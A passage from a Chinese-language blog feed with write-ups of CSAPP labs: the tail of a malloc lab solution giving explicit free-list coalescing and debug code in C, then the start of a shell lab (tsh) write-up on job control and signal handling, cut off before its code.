!next_alloc)</span><br><span class="line">        &#123; <span class="comment">// case 2: 前分配，后未分配</span></span><br><span class="line">            case2(bp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123; <span class="comment">// case 4: 前后都未分配</span></span><br><span class="line">            case4(bp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 前后都分配</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> * @return void* </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">case1</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    insert_to_free_list(bp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 前分配后未分配</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> * @return void* </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">case2</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *next_blockp = NEXT_BLKP(bp);</span><br><span class="line">    <span class="keyword">void</span> *prev_free_blockp;</span><br><span class="line">    <span class="keyword">void</span> *next_free_blockp;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp)) + GET_SIZE(HDRP(next_blockp));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新块大小</span></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(next_blockp), PACK(size, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新前后free block指针</span></span><br><span class="line">    prev_free_blockp = PREV_FREE_BLKP(next_blockp);</span><br><span class="line">    next_free_blockp = NEXT_FREE_BLKP(next_blockp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 边界检查</span></span><br><span class="line">    <span class="keyword">if</span> (next_free_blockp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_blockp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_blockp), next_free_blockp);</span><br><span class="line">        PUT(PREV_PTR(next_free_blockp), prev_free_blockp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    insert_to_free_list(bp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="case3"><a href="#case3" class="headerlink" title="case3"></a>case3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief case 3 前一个block未分配，后一个块已分配</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp 当前块的payload首地址</span></span><br><span class="line"><span class="comment"> * @return void* 合并后的payload首地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">case3</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *prev_blockp = PREV_BLKP(bp);</span><br><span class="line">    <span class="keyword">char</span> *prev_free_blockp;</span><br><span class="line">    <span class="keyword">char</span> *next_free_blockp;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp)) + GET_SIZE(HDRP(prev_blockp));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新块大小</span></span><br><span class="line">    PUT(HDRP(prev_blockp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(prev_blockp), PACK(size, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到前后free块并更新</span></span><br><span class="line">    next_free_blockp = NEXT_FREE_BLKP(prev_blockp);</span><br><span class="line">    prev_free_blockp = PREV_FREE_BLKP(prev_blockp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 边界检查</span></span><br><span class="line">    <span class="keyword">if</span> (next_free_blockp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_blockp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_blockp), next_free_blockp);</span><br><span class="line">        PUT(PREV_PTR(next_free_blockp), prev_free_blockp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LIFO策略，插入到free list的头部</span></span><br><span class="line">    insert_to_free_list(prev_blockp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="case4"><a href="#case4" class="headerlink" title="case4"></a>case4</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 前后都未分配</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> * @return void* </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">case4</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *prev_blockp;</span><br><span class="line">    <span class="keyword">void</span> *prev1_free_blockp;</span><br><span class="line">    <span class="keyword">void</span> *next1_free_blockp;</span><br><span class="line">    <span class="keyword">void</span> *next_blockp;</span><br><span class="line">    <span class="keyword">void</span> *prev2_free_blockp;</span><br><span class="line">    <span class="keyword">void</span> *next2_free_blockp;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    prev_blockp = PREV_BLKP(bp);</span><br><span class="line">    next_blockp = NEXT_BLKP(bp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新size</span></span><br><span class="line">    <span class="keyword">size_t</span> size1 = GET_SIZE(HDRP(prev_blockp));</span><br><span class="line">    <span class="keyword">size_t</span> size2 = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="keyword">size_t</span> size3 = GET_SIZE(HDRP(next_blockp));</span><br><span class="line">    size = size1 + size2 + size3;</span><br><span class="line">    PUT(HDRP(prev_blockp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(next_blockp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    bp = prev_blockp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新前半部 free block指针</span></span><br><span class="line">    prev1_free_blockp = PREV_FREE_BLKP(prev_blockp);</span><br><span class="line">    next1_free_blockp = NEXT_FREE_BLKP(prev_blockp);</span><br><span class="line">    <span class="keyword">if</span> (next1_free_blockp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev1_free_blockp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev1_free_blockp), next1_free_blockp);</span><br><span class="line">        PUT(PREV_PTR(next1_free_blockp), prev1_free_blockp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新后半部 free block指针</span></span><br><span class="line">    prev2_free_blockp = PREV_FREE_BLKP(next_blockp);</span><br><span class="line">    next2_free_blockp = NEXT_FREE_BLKP(next_blockp);</span><br><span class="line">    <span class="keyword">if</span> (next2_free_blockp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev2_free_blockp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev2_free_blockp), next2_free_blockp);</span><br><span class="line">        PUT(PREV_PTR(next2_free_blockp), prev2_free_blockp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据LIFO策略插入free list</span></span><br><span class="line">    insert_to_free_list(bp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="其余debug用的函数"><a href="#其余debug用的函数" class="headerlink" title="其余debug用的函数"></a>其余debug用的函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    print_allocated_info();</span><br><span class="line">    print_free_blocks_info();</span><br><span class="line">    consistent_check();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief  打印分配情况</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_allocated_info</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line">    <span class="keyword">size_t</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *mem_max_addr = mem_heap_hi();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=============start allocated info===========\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (bp = NEXT_BLKP(free_list_head); bp &lt; mem_max_addr &amp;&amp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (GET_ALLOC(HDRP(bp)) == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ++idx;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;block%d range %p  %p size=%d, payload %p  %p block size=%d\n&quot;</span>, idx, HDRP(bp), FTRP(bp) + WSIZE, FTRP(bp) - HDRP(bp) + WSIZE, (<span class="keyword">char</span> *)bp, FTRP(bp), FTRP(bp) - (<span class="keyword">char</span> *)(bp));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=============end allocated info===========\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">consistent_check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检查free list中的所有block都为free</span></span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line">    <span class="keyword">char</span> *mem_max_heap = mem_heap_hi();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (bp = NEXT_FREE_BLKP(free_list_head); bp != <span class="literal">NULL</span>; bp = NEXT_FREE_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (GET_ALLOC(HDRP(bp)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d free list中存在块已分配\n&quot;</span>, __LINE__);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否所有free block都在free list中</span></span><br><span class="line">    <span class="keyword">for</span> (bp = NEXT_BLKP(free_list_head); bp &lt;= mem_max_heap; bp = NEXT_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!GET_ALLOC(HDRP(bp)) &amp;&amp; !is_in_free_list(bp))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d 存在free block %p 不在free list中\n&quot;</span>, __LINE__, bp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">is_in_free_list</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p;</span><br><span class="line">    <span class="keyword">for</span> (p = NEXT_FREE_BLKP(free_list_head); p != <span class="literal">NULL</span>; p = NEXT_FREE_BLKP(p))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (p == bp)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面就是整个explicit list的实现了. 最终实现的效果是,跑完所有trace file,得分 83/100. 算是个良水平吧. 要想实现优秀水平,可以考虑做做segregated list或者red block tree list.</p><p>再谈一些优化:</p><ol><li>空间优化,对于分配的block, 可以不存储NEXT和PREV指针, 从而扩大payload空间,提高空间利用率.</li><li>封装整个free list, 然后改用segregated list.</li><li>现在search策略是从头search到尾部, ,比较慢,可以针对每个free block建立index, index数据结构选择rbtree, 应该可以大大提高分配吞吐量.</li></ol><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>嗯, 个人觉得这个lab仅次于cachelab, 但是它的难点不在于思路,而在于如何调试,毕竟像我这样的菜鸡,不debug是不可能,这辈子都不可能不debug的, 而这次lab有很多macros, 就很难在gdb中调试,gdb中也只能通过exam命令查看连续的地址内存空间, 但是当trace file中给定的malloc size过大时, exam命令也很难快速查看, 所以个人在做的时候, 将trace file的malloc size手动改小了(当然后面还是改回去了的),然后debug就会相对轻松一些. </p><p>再谈谈收获, 总算清晰的知道了什么是虚拟内存,页表,TLB,为什么要设计它们,它们有什么好处. 也知道了malloc的基本工作原理, 现在想想这些技术也不是离我们那么遥远, 继续加油吧, 下一个lab是网络相关的了, 不过下一次lab又得暂停一阵子了, 项目的事情让人心累…</p>]]></content>
      
      
      <categories>
          
          <category> Csapp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Csapp-Shlab题解</title>
      <link href="/archives/cf3e2591.html"/>
      <url>/archives/cf3e2591.html</url>
      
        <content type="html"><![CDATA[<p>本次lab, shlab. 即编写一个简单的shell。</p><h2 id="0-背景知识"><a href="#0-背景知识" class="headerlink" title="0. 背景知识"></a>0. 背景知识</h2><p>shlab相对其它lab要简单一些，但是其中牵涉出来的一些概念是相当难的。简单说一下这次lab依赖的背景知识吧。</p><blockquote><p>书籍对应 异常控制流 章节</p></blockquote><ol><li>理解进程的概念，linux如何创建新进程，进程的状态转换，回收等过程。</li><li>理解linux中的signal概念，掌握如何发送、接收、处理signal事件，理解signal handler中的 <strong>Async-Signal-Safety问题及解决方案（也是本次实验的难点）</strong> ，掌握async-signal-safety的guideline.</li></ol><a id="more"></a><h2 id="1-题目要求"><a href="#1-题目要求" class="headerlink" title="1. 题目要求"></a>1. 题目要求</h2><p>题目的要求主要看shlab的writeup的 《The tsh Specification》小节：</p><p>Your tsh shell should have the following features:</p><ol><li><p>The prompt should be the string “tsh&gt; ”.</p></li><li><p>The command line typed by the user should consist of a name and zero or more arguments, all separated by one or more spaces. If name is a built-in command, then tsh should handle it immediately and wait for the next command line. Otherwise, tsh should assume that name is the path of an executable file, which it loads and runs in the context of an initial child process (In this context, the term <em>job</em> refers to this initial child process).</p></li><li><p>tsh need not support pipes (|) or I/O redirection (&lt; and &gt;).</p></li><li><p>Typing ctrl-c (ctrl-z) should cause a SIGINT (SIGTSTP) signal to be sent to the current foreground job, as well as any descendents of that job (e.g., any child processes that it forked). If there is no foreground job, then the signal should have no effect.</p></li><li><p>If the command line ends with an ampersand &amp;, then tsh should run the job in the background. Otherwise, it should run the job in the foreground.</p></li><li><p>Each job can be identified by either a process ID (PID) or a job ID (JID), which is a positive integer assigned by tsh. JIDs should be denoted on the command line by the prefix ’%’. For example, “%5” denotes JID 5, and “5” denotes PID 5. (We have provided you with all of the routines you need for manipulating the job list.)</p></li><li><p>tsh should support the following built-in commands:<br>– The quit command terminates the shell.<br>– The jobs command lists all background jobs.<br>– The bg <job> command restarts <job> by sending it a SIGCONT signal, and then runs it inthe background. The <job> argument can be either a PID or a JID.<br>– The fg <job> command restarts <job> by sending it a SIGCONT signal, and then runs it in the foreground. The <job> argument can be either a PID or a JID.</p></li><li><p>tsh should reap all of its zombie children. If any job terminates because it receives a signal that it didn’t catch, then tsh should recognize this event and print a message with the job’s PID and a description of the offending signal.</p></li></ol><p>上述是整个shell的功能要求，但是我们不必从0写整个代码，整体代码的框架是已经搭建好了的，只用完成tsh.c文件中的以下几个函数：</p><ol><li>eval: Main routine that parses and interprets the command line. [70 lines]</li><li>builtin cmd: Recognizes and interprets the built-in commands: quit, fg, bg, and jobs. [25 lines]</li><li>do bgfg: Implements the bg and fg built-in commands. [50 lines]</li><li>waitfg: Waits for a foreground job to complete. [20 lines]</li><li>sigchld handler: Catches SIGCHILD signals. 80 lines]</li><li>sigint handler: Catches SIGINT (ctrl-c) signals. [15 lines]</li><li>sigtstp handler: Catches SIGTSTP (ctrl-z) signals. [15 lines]</li></ol><p>一共7个函数，每个函数也给出了建议的行数。</p><p>再看下如何验证lab。 shlab提供了tshref，用于参考。同时给出了16个trace file以及一个driver，具体验证过程为， trace file指导driver运行制定shell，查看我们写的shell是否和tshref输出一致。举个例子，执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make test01</span><br></pre></td></tr></table></figure><p>driver会读取trace01.txt, 在tsh（我们写的shell）下执行trace01.txt中的命令，然后tsh会给出一些输出。此时再执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make rtest01</span><br></pre></td></tr></table></figure><p>driver会读取trace01.txt 在tshref(参考的shell)下执行trace01.txt中的命令，然后tshref会给出一些输出。对比两次输出，即可知道自己写的shell是否正确了。</p><p>当然了，一共16个trace file,每次都make，相当麻烦，所以lab中还给出了 tshref.out文件，这里面给出了所有tshref的输出结果。</p><h2 id="2-题目分析"><a href="#2-题目分析" class="headerlink" title="2. 题目分析"></a>2. 题目分析</h2><p>稍微思考下，可以分析出，其实shell就两种命令，一种buildin命令(fg,bg,quit,jobs)，需要立即在shell中执行，一种外部命令，需要fork出新进程来执行，只不过这里需要考虑是前台进程和后台进程。</p><p>那先说说<strong>buildin命令</strong>，其中 jobs 已经有默认实现了，quit也相对简单，剩下的就是fg和bg。</p><p>那fg和bg做了什么事情呢? 其实代码中已经给出了答案：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Jobs states: FG (foreground), BG (background), ST (stopped)</span></span><br><span class="line"><span class="comment"> * Job state transitions and enabling actions:</span></span><br><span class="line"><span class="comment"> *     FG -&gt; ST  : ctrl-z</span></span><br><span class="line"><span class="comment"> *     ST -&gt; FG  : fg command</span></span><br><span class="line"><span class="comment"> *     ST -&gt; BG  : bg command</span></span><br><span class="line"><span class="comment"> *     BG -&gt; FG  : fg command</span></span><br><span class="line"><span class="comment"> * At most 1 job can be in the FG state.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>fg命令，无法是将后台（Running 或 Stopped）转换到前台来。</p><p>bg命令，将后台Stopped的进程转换为后台Running。</p><p>额外的一些工作就是fg和bg的语法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fg%jid</span><br><span class="line">或</span><br><span class="line">fg pid</span><br></pre></td></tr></table></figure><p>自己通过是否有%来解析就好。</p><p>再来看看<strong>外部命令</strong> ， 在parseline函数执行时，会返回当前的命令是前台进程还是后台进程。所以这部分不用我们操心。我们唯一需要做得，就是对前台进程和后台进程”分别处理“。</p><p><strong>这里会用到几个知识点：</strong></p><ol><li><p>子进程在terminate或stop时，内核会发送SIGCHLD给父进程</p></li><li><p>父进程需要通过wait族函数回收子进程，否则子进程变为zombie进程，耗费系统资源。</p></li></ol><p>ok，有了两个知识点，思考一下如何对待前台进程和后台进程：</p><ol><li>前台进程：最为直接的想法就是父进程调用wait系统调用，等待前台进程结束。但请注意刚才提到的知识点1，前台进程结束后，wait系统调用的确返回了，但同时，父进程会收到SIGCHLD信号，sigchld_handler会被调用。这会带来什么问题？接着看后台进程如何处理。</li><li>后台进程：后台进程意味不能阻塞tsh进程，也就意味着我们不能在tsh中调用wait系统调用，那唯一能回收后台进程（除非强制kill）就是当后台进程结束后，父进程会收到SIGHLD信号，通过sigchld_handler来回收，也就意味着我们的sigchld_handler中会有wait系统调用的存在。<strong>ok，结合目前前台进程的处理，就会存在一个严重的问题。</strong></li></ol><p><strong>前台进程，在tsh.c 中出现了两次wait操作。一次在最开始fork出前台进程时，一次出现在sigchld_handler中。</strong>所以这种情况需要处理，大体思路有两种：</p><ol><li>前台进程，fork后立即wait保持不变，在sigchld_handler中过滤掉前台进程的terminate，避免重复wait。</li><li>前台进程，fork后的wait变为”伪wait”, 前后台进程统一在sigchld_handler中回收处理。那什么是”伪wait“，我们要之前前台进程的意思是什么，作用是什么，作用就是阻塞住当前的tsh，不允许输入新命令，除此之外，前后台进程都是一样的。ok，既然这样，我们只用让tsh阻塞住即可，采用什么方法则看个人实现了。</li></ol><p>显然，第二种统一处理更容易理解，维护。当然，writeup其实给出了一种解决方案：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200805133536133.png" alt="image-20200805133536133"></p><p>另外一个问题就是，<strong>信号的转发</strong>。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200805133902911.png" alt="image-20200805133902911"></p><p>这里要解决的是，后台进程不应该接收到Ctrl-C所引发的信号。</p><p>还有一个问题就是<strong>保持和tshref的输出相同</strong>，那需要在恰当的位置，打印出相应的信息，这部分不难，但其实挺磨人的。</p><p>最后就是非tsh需求的逻辑部分了，那就是<strong>如何编写 async-signal-safety 的代码</strong>。如果你是看了csapp课程或书籍的话， 那应该可以意识这里会有一些async-signal-safety问题。ppt中其实基本上给出所有我们会遇到的问题，以及一些常用的guideline。这部分需要仔细阅读，理解清楚，必然很可能出现一些莫名的bug。</p><p>下面贴出我个人的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 